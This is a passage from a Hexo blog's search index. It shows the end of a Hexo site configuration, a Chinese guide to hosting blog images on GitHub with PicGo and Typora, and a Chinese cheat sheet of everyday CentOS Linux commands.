class="literal">false</span></span><br><span class="line"><span class="attr">future:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">auto_detect:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">wrap:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hljs:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">prismjs:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preprocess:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Metadata elements</span></span><br><span class="line"><span class="comment">## https://developer.mozilla.org/en-US/docs/Web/HTML/Element/meta</span></span><br><span class="line"><span class="attr">meta_generator:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-MM-DD</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">HH:mm:ss</span></span><br><span class="line"><span class="comment">## updated_option supports &#x27;mtime&#x27;, &#x27;date&#x27;, &#x27;empty&#x27;</span></span><br><span class="line"><span class="attr">updated_option:</span> <span class="string">&#x27;mtime&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Include / Exclude file(s)</span></span><br><span class="line"><span class="comment">## include:/exclude: options only apply to the &#x27;source/&#x27; folder</span></span><br><span class="line"><span class="attr">include:</span></span><br><span class="line"><span class="attr">exclude:</span></span><br><span class="line"><span class="attr">ignore:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="comment">## Plugins: https://hexo.io/plugins/</span></span><br><span class="line"><span class="comment">## Themes: https://hexo.io/themes/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repo:</span> <span class="string">git@github.com:he-zhifei/he-zhifei.github.io.git</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search功能</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span></span><br><span class="line">  <span class="attr">content:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span></span><br><span class="line"></span><br><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">time:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_symbols:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_time:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">exclude_codeblock:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">awl:</span> <span class="number">4</span></span><br><span class="line">  <span class="attr">wpm:</span> <span class="number">275</span></span><br><span class="line">  <span class="attr">suffix:</span> <span class="string">&quot;mins.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置本地服务端口，不配置默认也是4000</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">4000</span></span><br><span class="line">  <span class="attr">compress:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">header:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>


<h2 id="5-3-配置GitHub图床"><a href="#5-3-配置GitHub图床" class="headerlink" title="5.3 配置GitHub图床"></a>5.3 配置GitHub图床</h2><h3 id="1）创建github用来存放文件的仓库"><a href="#1）创建github用来存放文件的仓库" class="headerlink" title="1）创建github用来存放文件的仓库"></a>1）创建github用来存放文件的仓库</h3><p><img src="/../img/202204180301168.png" alt="202204180301168.png"></p>
<h3 id="2）生成github的token"><a href="#2）生成github的token" class="headerlink" title="2）生成github的token"></a>2）生成github的token</h3><p>登录github -&gt; settings -&gt; developer settings -&gt; Personal access tokens -&gt; generate new token -&gt;<br><img src="/../img/202204180312572.png" alt="202204180312572.png"></p>
<hr>
<p><img src="/../img/202204180318715.png" alt="202204180318715.png"></p>
<hr>
<h3 id="3）配置PicGo"><a href="#3）配置PicGo" class="headerlink" title="3）配置PicGo"></a>3）配置PicGo</h3><p>下载PicGo，打开PicGo的<a href="https://github.com/Molunerfinn/PicGo">github官网</a>，<a href="https://github.com/Molunerfinn/PicGo/releases/download/v2.3.0/PicGo-Setup-2.3.0-x64.exe">下载PicGo-Setup-2.3.0-x64.exe</a>进行安装，并配置如下：</p>
<p><img src="/../img/202204180331096.png"></p>
<p>​		cdn加速规则：<code>https://cdn.jsdelivr.net/gh/用户名/仓库名</code>，可不填，但是会比较慢</p>
<p><img src="/../img/202204180342266.png" alt="image-20220418034205222"></p>
<h3 id="4）配置typora"><a href="#4）配置typora" class="headerlink" title="4）配置typora"></a>4）配置typora</h3><p><img src="/../img/202204180335999.png" alt="image-20220418033557944"></p>
<p>注意：上传时，需要把FastGithub、steam++等加速github的软件关闭，否则会导致上传失败。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>NexT</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux常用命令(CentOS)</title>
    <url>/2021/07/26/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4(CentOS)/</url>
    <content><![CDATA[<h1 id="1-基础命令"><a href="#1-基础命令" class="headerlink" title="1. 基础命令"></a>1. 基础命令</h1><p>提示：用法中的[]表示可选参数，&lt;&gt;表示必选参数。</p>
<h2 id="1-1-shutdown"><a href="#1-1-shutdown" class="headerlink" title="1.1 shutdown"></a>1.1 shutdown</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">立刻关机</span></span><br><span class="line">shutdown -h now 或 poweroff</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5分钟后关机</span></span><br><span class="line">shutdown -h 5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启</span></span><br><span class="line">shutdown -r now 或 reboot</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">5分钟后重启</span></span><br><span class="line">shutdown -r 5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">取消shutdown计划</span></span><br><span class="line">shutdown -c</span><br></pre></td></tr></table></figure>

<h2 id="1-2-–help参数"><a href="#1-2-–help参数" class="headerlink" title="1.2 –help参数"></a>1.2 –help参数</h2><p>用法：&lt;命令&gt; –help	查看命令的相关用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看<span class="built_in">ls</span>的相关用法</span></span><br><span class="line">ls --help</span><br></pre></td></tr></table></figure>

<h2 id="1-3-man"><a href="#1-3-man" class="headerlink" title="1.3 man"></a>1.3 man</h2><p>用法：man &lt;命令&gt; 	查看命令的用户手册，q-退出，空格-下一页，b-上一页</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看<span class="built_in">ls</span>命令的用户手册</span></span><br><span class="line">man ls</span><br></pre></td></tr></table></figure>

<h1 id="2-目录命令"><a href="#2-目录命令" class="headerlink" title="2. 目录命令"></a>2. 目录命令</h1><h2 id="2-1-cd"><a href="#2-1-cd" class="headerlink" title="2.1 cd"></a>2.1 cd</h2><p>用法：cd [目录]		切换到指定目录，可以是相对路径，也可以是绝对路径。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到/aaa目录</span></span><br><span class="line">cd /aaa</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到当前用户根目录</span></span><br><span class="line">cd ~</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到上次访问的目录</span></span><br><span class="line">cd -</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切换到上一层目录</span></span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>

<h2 id="2-2-ls"><a href="#2-2-ls" class="headerlink" title="2.2 ls"></a>2.2 ls</h2><p>用法：ls [参数]… [目录或文件]…		查看目录或文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-a, --all				列出所有</span><br><span class="line">-A, --almost-all		列出除.和..外的所有</span><br><span class="line">	--author			与-l同时使用时列出每个条目的作者</span><br><span class="line">-h, --human-readable	与-l一起，以易于阅读的格式输出文件大小(例如 1K 234M 2G)</span><br><span class="line">-l						使用较长格式列出信息</span><br><span class="line">-r, --reverse			逆序排列</span><br><span class="line">-R, --recursive			递归显示子目录</span><br><span class="line">-S						按文件大小排序</span><br><span class="line">    --sort=WORD			以指定方式排序，WORD可选值: none (-U), size (-S), time (-t), version (-v), extension (-X)</span><br><span class="line">-t						按修改时间排序，最新的优先</span><br><span class="line"></span><br><span class="line">ls -la 相当于 ll -a</span><br></pre></td></tr></table></figure>

<h2 id="2-3-mkdir"><a href="#2-3-mkdir" class="headerlink" title="2.3 mkdir"></a>2.3 mkdir</h2><p>用法：mkdir [选项]… 目录…		创建目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-p, --parents	先创建父级文件夹（假如不存在）</span><br></pre></td></tr></table></figure>

<h2 id="2-4-rm"><a href="#2-4-rm" class="headerlink" title="2.4 rm"></a>2.4 rm</h2><p>用法：rm [选项]… 文件…		删除文件或文件夹</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-f				强制删除（不弹出是否确认删除）</span><br><span class="line">-r				递归删除目录</span><br><span class="line">-d, --dir		移除空目录</span><br><span class="line">-v, --verbose	显示详细的进行步骤</span><br><span class="line"></span><br><span class="line">rm -rf /aaa/bbb		强制递归删除/aaa/bbb目录</span><br><span class="line">rm -rf /aaa/*		强制递归删除/aaa/下的任何目录或文件</span><br></pre></td></tr></table></figure>

<h2 id="2-5-mv"><a href="#2-5-mv" class="headerlink" title="2.5 mv"></a>2.5 mv</h2><p>用法：mv [选项]… [-T] 源文件 目标文件		（移动并）重命名<br>　或：mv [选项]… 源文件… 目录					源文件移动到指定目录下<br>　或：mv [选项]… -t 目录 源文件…				源文件移动到指定目录下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-b						类似--backup 但不接受参数</span><br><span class="line">-f, --force				覆盖前不询问</span><br><span class="line">-i, --interactive		覆盖前询问</span><br><span class="line">-n, --no-clobber		不覆盖已存在文件</span><br><span class="line">如果您指定了-i、-f、-n 中的多个，仅最后一个生效。</span><br><span class="line">-S, --suffix=SUFFIX		替换常用的备份文件后缀</span><br><span class="line">-v, --verbose			显示详细的进行步骤</span><br></pre></td></tr></table></figure>

<h2 id="2-6-cp"><a href="#2-6-cp" class="headerlink" title="2.6 cp"></a>2.6 cp</h2><p>用法：cp [选项]… [-T] 源文件 目标文件		文件复制<br>　或：cp [选项]… 源文件… 目录					<br>　或：cp [选项]… -t 目录 源文件…</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-b						类似--backup 但不接受参数</span><br><span class="line">-f, --force				覆盖前不询问</span><br><span class="line">-i, --interactive		覆盖前询问</span><br><span class="line">-n, --no-clobber		不要覆盖已存在的文件(使前面的 -i 选项失效)</span><br><span class="line">-R, -r, --recursive		递归复制目录及其子目录内的所有内容</span><br><span class="line">-S, --suffix=SUFFIX		自行指定备份文件的后缀</span><br><span class="line">-u, --update			只在源文件比目标文件新，或目标文件不存在时才进行复制</span><br><span class="line">-v, --verbose			显示详细的进行步骤</span><br><span class="line"></span><br><span class="line">通常：rf参数连用</span><br></pre></td></tr></table></figure>

<h2 id="2-7-find"><a href="#2-7-find" class="headerlink" title="2.7 find"></a>2.7 find</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/xxx及其子目录下查找.txt结尾的文件或目录</span></span><br><span class="line">find /xxx -name &quot;*.txt&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在/xxx及其子目录下查找名称为aaa的目录，-<span class="built_in">type</span>参数：d-目录；f-文件</span></span><br><span class="line">find /xxx -name &quot;aaa&quot; -type d</span><br></pre></td></tr></table></figure>

<h2 id="2-8-pwd"><a href="#2-8-pwd" class="headerlink" title="2.8 pwd"></a>2.8 pwd</h2><p>用法：pwd		查看当前工作目录</p>
<h1 id="3-文件命令"><a href="#3-文件命令" class="headerlink" title="3. 文件命令"></a>3. 文件命令</h1><h2 id="3-1-touch"><a href="#3-1-touch" class="headerlink" title="3.1 touch"></a>3.1 touch</h2><p>用法：touch [选项]… 文件…		创建文件（若已存在，则只更新文件的修改时间）</p>
<h2 id="3-2-vi-vim"><a href="#3-2-vi-vim" class="headerlink" title="3.2 vi(vim)"></a>3.2 vi(vim)</h2><p>用法：vi &lt;文件&gt;		编辑文件（若不存在，则在保存退出后创建），有3种模式：命令模式（默认）、插入模式、末行模式。</p>
<p>若命令缺失，先安装：yum -y install vim</p>
<p>在命令模式下：</p>
<ul>
<li>ctrl + f 下一页，ctrl + b 上一页；</li>
<li>0 光标移动到行首字符，$ 光标移动到行尾字符；</li>
<li>G 光标移动到最后一行，gg 光标移动到首行；</li>
<li>dd 删除光标所在行；</li>
<li>yy 复制光标所在行，p 在光标所在行的下一行粘贴，P 在光标所在行的上一行粘贴；</li>
<li>u 撤销修改，vi只能撤销上一次，vim可无限次撤销；</li>
</ul>
<p>在命令模式下，输入以下的任一个字符进入插入模式：</p>
<ul>
<li>i 从光标位置插入；</li>
<li>I 从光标所在行的第一个非空白字符插入；</li>
<li>o 从光标所在行的下一行插入；</li>
<li>O 从光标所在行的上一行插入；</li>
<li>a 从光标位置下一个字符插入；</li>
<li>A 从光标所在行的行尾插入；</li>
</ul>
<p>在命令模式下，输入以下的任一个字符进入末行模式：</p>
<ul>
<li>&#x2F; 从光标位置往下查找字符，&#x2F;abc 向下查找abc（n 下一个，N 上一个）；</li>
<li>? 从光标位置往上查找字符，&#x2F;abc 向下查找abc（n 下一个，N 上一个）；</li>
<li>: 可以替换字符，:1,$s&#x2F;abc&#x2F;ABC&#x2F;gc 表示从第一行到最后一行查找并替换，把abc替换成ABC，并且每次替换前需要确认（如果没加参数c则不需要确认），$代表末行，可以指定具体行；:wq 表示保存并退出；:q! 表示不保存退出；</li>
</ul>
<p>注：按 ESC 可从插入模式或末行模式退回到命令模式。</p>
<h2 id="3-3-cat"><a href="#3-3-cat" class="headerlink" title="3.3 cat"></a>3.3 cat</h2><p>用法：cat [选项]… [文件]…		查看文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-n, --number		对输出的所有行编号</span><br></pre></td></tr></table></figure>

<h2 id="3-4-less"><a href="#3-4-less" class="headerlink" title="3.4 less"></a>3.4 less</h2><p>用法：less [选项] [文件]…		查看文件，回车-下一行，空格-下一页，b-上一页，q-退出，&#x2F;往后检索，?往前检索，G最后一页，gg首页。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-m		展示查看文件的百分比</span><br><span class="line">-M		展示查看文件的百分比以及当前页行号范围</span><br><span class="line">-N      展示每一行的行号</span><br><span class="line"></span><br><span class="line">通常：-mN 或 -MN 连用。</span><br><span class="line">注：less不必读整个文件，加载速度比more更快，且查看到最后一页不会自动退出，退出后不会在shell上显示查看的内容。</span><br></pre></td></tr></table></figure>

<h2 id="3-5-more"><a href="#3-5-more" class="headerlink" title="3.5 more"></a>3.5 more</h2><p>用法：more [选项] 文件… 		查看文件，回车-下一行，空格-下一页，b-上一页，q-退出，到达最后一页会自动退出。</p>
<h2 id="3-6-head"><a href="#3-6-head" class="headerlink" title="3.6 head"></a>3.6 head</h2><p>用法：head [选项]… [文件]…		从头查看文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-c, --bytes=[-]K		打印每个文件的前K个字节;加上-，打印除后K个字节外的内容</span><br><span class="line">-n, --lines=[-]K		打印每个文件的前K行（默认10行）;加上-，打印除后K行外的内容</span><br><span class="line">-q, --quiet, --silent	不输出包含文件名的文件头</span><br><span class="line">-v, --verbose			输出包含文件名的文件头</span><br></pre></td></tr></table></figure>

<h2 id="3-7-tail"><a href="#3-7-tail" class="headerlink" title="3.7 tail"></a>3.7 tail</h2><p>用法：tail [选项]… [文件]…		从尾查看文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-c, --bytes=K			输出最后K个字节;或使用-c +K输出每个文件从第k个开始的字节</span><br><span class="line">-f, --follow[=&#123;name|descriptor&#125;]		随着文件内容增加跟踪输出</span><br><span class="line">-n, --lines=K			输出后K行（默认10行）</span><br><span class="line">-q, --quiet, --silent	不输出包含文件名的文件头</span><br><span class="line">-s, --sleep-interval=N	结合-f，指定多少秒输出一次（默认1s）</span><br><span class="line">-v, --verbose			输出包含文件名的文件头</span><br></pre></td></tr></table></figure>

<h1 id="4-权限命令"><a href="#4-权限命令" class="headerlink" title="4. 权限命令"></a>4. 权限命令</h1><p>权限说明：通过 ls -l 可查看文件或目录的权限。比如 drwxr-xr-x 第1位为d说明是目录（-为文件），后续每3位为一组，每组各位分别代表（r可读；w可写；x可执行，省缺”-“代表无该权限），第一组是所有者的权限，第二组是属组（所有者所属的组），第三组是其它用户的权限。每组权限分别用二进制表示，这个权限为755。只有所有者和root才能修改其文件的权限。</p>
<h2 id="4-1-chown"><a href="#4-1-chown" class="headerlink" title="4.1 chown"></a>4.1 chown</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">用法：chown [选项]... [所有者][:[组]] 文件...		修改文件（文件夹）的所有者或属组，-R递归修改权限</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">chown root /xxx         将/xxx的属主更改为root。</span><br><span class="line">chown root:staff /xxx   和上面类似，但同时也将其属组更改为staff。</span><br></pre></td></tr></table></figure>

<h2 id="4-2-chgrp"><a href="#4-2-chgrp" class="headerlink" title="4.2 chgrp"></a>4.2 chgrp</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">用法：chgrp [选项]... 用户组 文件...		改变文件属组，等效于chown [选项]... :用户组 文件...，-R递归修改权限。</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">chgrp -R staff /xxx		递归修改/xxx目录的属组为staff</span><br></pre></td></tr></table></figure>

<h2 id="4-3-chmod"><a href="#4-3-chmod" class="headerlink" title="4.3 chmod"></a>4.3 chmod</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改权限</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例，u表示所有者，g表示属组，o表示其它用户，a表示全部，+表示增加,-表示撤销，=表示与谁一样。-R递归修改权限：</span></span><br><span class="line">chmod u+w aaa		增加所有者对aaa的写入权限</span><br><span class="line">chmod u=rwx aaa		修改所有者对aaa的权限为rwx</span><br><span class="line">chmod o=u aaa		修改其它用户对aaa的权限为与所有者的一样</span><br><span class="line">chmod g-wx aaa		撤销属组对aaa的写入、执行权限</span><br><span class="line">chmod 744 aaa		修改aaa的权限为744，权限为：-rwxr--r--</span><br></pre></td></tr></table></figure>

<h2 id="4-4-groupadd"><a href="#4-4-groupadd" class="headerlink" title="4.4 groupadd"></a>4.4 groupadd</h2><p>用法：groupadd [选项] 组		创建用户组</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-f, --force		如果组已经存在则成功退出，并且如果 GID 已经存在则取消 -g</span><br><span class="line">-g, --gid GID	为新组使用 GID</span><br><span class="line">-r, --system	创建一个系统账户</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">groupadd group1		添加用户组group1</span><br></pre></td></tr></table></figure>

<h2 id="4-5-useradd"><a href="#4-5-useradd" class="headerlink" title="4.5 useradd"></a>4.5 useradd</h2><p>用法：useradd [选项] 用户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">useradd -G group1 lucy		创建lucy用户，并添加到group1组</span><br></pre></td></tr></table></figure>

<h2 id="4-6-passwd"><a href="#4-6-passwd" class="headerlink" title="4.6 passwd"></a>4.6 passwd</h2><p>用法: passwd [选项…] &lt;帐号名称&gt;</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数，不加参数首次设置密码：</span></span><br><span class="line">-k, --keep-tokens       保持身份验证令牌不过期</span><br><span class="line">-d, --delete            删除帐号的密码(只有根用户才能进行此操作)</span><br><span class="line">-l, --lock              锁定帐户的密码(仅限 root 用户)</span><br><span class="line">-u, --unlock            解锁账户的密码(仅限 root 用户)</span><br><span class="line">-e, --expire            终止帐户的密码(仅限 root 用户)</span><br><span class="line">-f, --force             强制执行操作</span><br><span class="line">-S, --status            报告帐号的密码状态(只有根用户才能进行此操作)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">passwd lucy		初始化lucy的密码</span><br></pre></td></tr></table></figure>

<h2 id="4-7-su"><a href="#4-7-su" class="headerlink" title="4.7 su"></a>4.7 su</h2><p>用法：su &lt;用户&gt;	切换到指定用户</p>
<h2 id="4-8-sudo"><a href="#4-8-sudo" class="headerlink" title="4.8 sudo"></a>4.8 sudo</h2><p>用法：sudo &lt;命令&gt;	以管理员身份执行命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">以管理员身份执行<span class="built_in">ls</span>命令</span></span><br><span class="line">sudo ls</span><br></pre></td></tr></table></figure>

<h1 id="5-内存磁盘"><a href="#5-内存磁盘" class="headerlink" title="5. 内存磁盘"></a>5. 内存磁盘</h1><h2 id="5-1-free"><a href="#5-1-free" class="headerlink" title="5.1 free"></a>5.1 free</h2><p>用法：free [选项]		显示内存使用情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">常用参数：</span></span><br><span class="line">-b, --bytes			单位：子节</span><br><span class="line">-k, --kilo          单位：KB</span><br><span class="line">-m, --mega          单位：MB</span><br><span class="line">-g, --giga          单位：GB</span><br><span class="line">    --tera          单位：TB</span><br><span class="line">    --peta          单位：PB</span><br><span class="line">-h, --human         单位根据大小而定，方便观察</span><br><span class="line">    --si            use powers of 1000 not 1024</span><br><span class="line">-t, --total         show total for RAM + swap</span><br><span class="line">-s N, --seconds N   每N秒输出一次</span><br><span class="line">-c N, --count N     重复输出N次，然后退出</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">示例：</span></span><br><span class="line">free -h -s 2</span><br></pre></td></tr></table></figure>

<h2 id="5-2-top"><a href="#5-2-top" class="headerlink" title="5.2 top"></a>5.2 top</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看占用资源较多的进程，<span class="built_in">shift</span> + m按照内存大小排序。</span></span><br><span class="line">top</span><br></pre></td></tr></table></figure>

<h2 id="5-3-df"><a href="#5-3-df" class="headerlink" title="5.3 df"></a>5.3 df</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">文件系统磁盘使用情况，-h单位根据大小而定，方便观察。</span></span><br><span class="line">df -h</span><br></pre></td></tr></table></figure>

<h2 id="5-4-du"><a href="#5-4-du" class="headerlink" title="5.4 du"></a>5.4 du</h2><p>用法：du [选项]… [文件]…		递归统计目录或文件大小</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">递归统计当前目录的文件大小，-h单位根据大小而定，方便观察，-s不细分文件夹。</span></span><br><span class="line">du -h</span><br></pre></td></tr></table></figure>

<h1 id="6-其它"><a href="#6-其它" class="headerlink" title="6. 其它"></a>6. 其它</h1><h2 id="6-1-grep"><a href="#6-1-grep" class="headerlink" title="6.1 grep"></a>6.1 grep</h2><ul>
<li>在每个FILE或是标准输入中查找PATTERN（egrep:支持正则表达式）</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep [选项]... PATTERN [FILE]...</span><br><span class="line"></span><br><span class="line">正则表达式选择与解释:</span><br><span class="line">  -E, --extended-regexp     PATTERN 是一个可扩展的正则表达式(缩写为 ERE)</span><br><span class="line">  -F, --fixed-strings       PATTERN 是一组由断行符分隔的定长字符串。</span><br><span class="line">  -G, --basic-regexp        PATTERN 是一个基本正则表达式(缩写为 BRE)</span><br><span class="line">  -P, --perl-regexp         PATTERN 是一个 Perl 正则表达式</span><br><span class="line">  -e, --regexp=PATTERN      用 PATTERN 来进行匹配操作</span><br><span class="line">  -f, --file=FILE           从 FILE 中取得 PATTERN</span><br><span class="line">  -i, --ignore-case         忽略大小写</span><br><span class="line">  -w, --word-regexp         强制 PATTERN 仅完全匹配字词</span><br><span class="line">  -x, --line-regexp         强制 PATTERN 仅完全匹配一行</span><br><span class="line">  -z, --null-data           一个 0 字节的数据行，但不是空行</span><br><span class="line"></span><br><span class="line">Miscellaneous:</span><br><span class="line">  -s, --no-messages         suppress error messages</span><br><span class="line">  -v, --invert-match        select non-matching lines</span><br><span class="line">  -V, --version             display version information and exit</span><br><span class="line">      --help                display this help text and exit</span><br><span class="line"></span><br><span class="line">输出控制:</span><br><span class="line">  -m, --max-count=NUM       NUM 次匹配后停止</span><br><span class="line">  -b, --byte-offset         输出的同时打印字节偏移</span><br><span class="line">  -n, --line-number         输出的同时打印行号</span><br><span class="line">      --line-buffered       每行输出清空</span><br><span class="line">  -H, --with-filename       为每一匹配项打印文件名</span><br><span class="line">  -h, --no-filename         输出时不显示文件名前缀</span><br><span class="line">      --label=LABEL         将LABEL 作为标准输入文件名前缀</span><br><span class="line">  -o, --only-matching       show only the part of a line matching PATTERN</span><br><span class="line">  -q, --quiet, --silent     suppress all normal output</span><br><span class="line">      --binary-files=TYPE   assume that binary files are TYPE;</span><br><span class="line">                            TYPE is &#x27;binary&#x27;, &#x27;text&#x27;, or &#x27;without-match&#x27;</span><br><span class="line">  -a, --text                equivalent to --binary-files=text</span><br><span class="line">  -I                        equivalent to --binary-files=without-match</span><br><span class="line">  -d, --directories=ACTION  how to handle directories;</span><br><span class="line">                            ACTION is &#x27;read&#x27;, &#x27;recurse&#x27;, or &#x27;skip&#x27;</span><br><span class="line">  -D, --devices=ACTION      how to handle devices, FIFOs and 